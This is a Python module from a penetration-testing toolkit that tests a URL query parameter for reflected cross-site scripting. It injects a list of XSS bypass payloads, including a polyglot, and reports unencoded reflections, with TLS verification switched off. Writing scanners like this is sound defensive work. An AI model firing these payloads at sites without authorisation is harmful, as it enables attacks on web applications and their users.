"""
modules/vuln_scan/xss_tester.py — Reflected XSS parameter injection tester.

Injects a diverse set of XSS payloads into a configurable query parameter
and checks whether the payload appears unencoded in the response body.
Confirmed reflections are reported as HIGH severity findings.
"""

import logging
from pathlib import Path
from urllib.parse import urlencode, urljoin

import requests
from requests.exceptions import RequestException
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from modules.base_module import BaseModule

logger = logging.getLogger(__name__)

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# -----------------------------------------------------------------------
# Diverse XSS payload list (10+ payloads covering various bypass techniques)
# -----------------------------------------------------------------------
XSS_PAYLOADS: list[str] = [
    # Classic
    "<script>alert(1)</script>",
    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    # IMG tag
    "<img src=x onerror=alert(1)>",
    # SVG
    "<svg onload=alert(1)>",
    # Case variation bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    # HTML5 autofocus
    "<input autofocus onfocus=alert(1)>",
    # Details / summary (Firefox)
    "<details open ontoggle=alert(1)>",
    # Body event
    "<body onload=alert(1)>",
    # Template literal (for JS context injection)
    "`};alert(1);//",
    # Double-encoded angle bracket
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Expression inside style
    "<style>body{background:url('javascript:alert(1)')}</style>",
    # Iframe srcdoc
    '<iframe srcdoc="<script>alert(1)</script>">',
    # Object data
    "<object data=\"javascript:alert(1)\">",
]


class XssTester(BaseModule):
    """Test a query parameter for reflected Cross-Site Scripting (XSS).

    For each payload in XSS_PAYLOADS, sends a GET request with the payload
    injected into the specified parameter and checks if the raw payload
    appears unencoded in the HTML response. Confirmed reflections are
    recorded as HIGH severity findings.
    """

    name = "XSS Tester"
    description = "Tests a query parameter for reflected XSS via payload injection."
    author = "K4os"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL (e.g. https://example.com/search).",
        },
        "param": {
            "value": None,
            "required": True,
            "description": "Query parameter name to inject into (e.g. q).",
        },
        "timeout": {
            "value": "5",
            "required": False,
            "description": "HTTP request timeout in seconds (default: 5).",
        },
    }

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Inject each XSS payload and check for unencoded reflection."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        param = self.get_option("param")
        timeout = int(self.get_option("timeout") or 5)

        config_path = _PROJECT_ROOT / "config.yaml"
        user_agent = "RedKit/1.0 (Authorized Security Testing)"
        try:
            import yaml
            with open(config_path) as f:
                cfg = yaml.safe_load(f)
                user_agent = cfg.get("default_user_agent", user_agent)
        except Exception:
            pass

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        headers = {"User-Agent": user_agent}
        logger.info("XSS testing: target=%s, param=%s, payloads=%d", target, param, len(XSS_PAYLOADS))

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing XSS payloads on {target}", total=len(XSS_PAYLOADS))

            for payload in XSS_PAYLOADS:
                progress.advance(task)
                url = f"{target}?{param}={requests.utils.quote(payload)}"
                try:
                    resp = requests.get(url, timeout=timeout, headers=headers, verify=False, allow_redirects=True)
                    if payload in resp.text:
                        logger.warning("XSS reflected: %s", payload)
                        self._add_finding(
                            finding_type="XSS",
                            severity="HIGH",
                            title=f"Reflected XSS in parameter '{param}'",
                            detail=(
                                f"The payload was reflected unencoded in the HTTP response body. "
                                f"An attacker can use this to execute arbitrary JavaScript in the victim's browser."
                            ),
                            evidence=f"GET {url}\nPayload: {payload}\nReflected in response body.",
                        )
                except RequestException as exc:
                    logger.debug("Request error for payload '%s': %s", payload, exc)

        total = len(self.get_findings())
        logger.info("XSS testing complete: %d reflection(s) confirmed.", total)
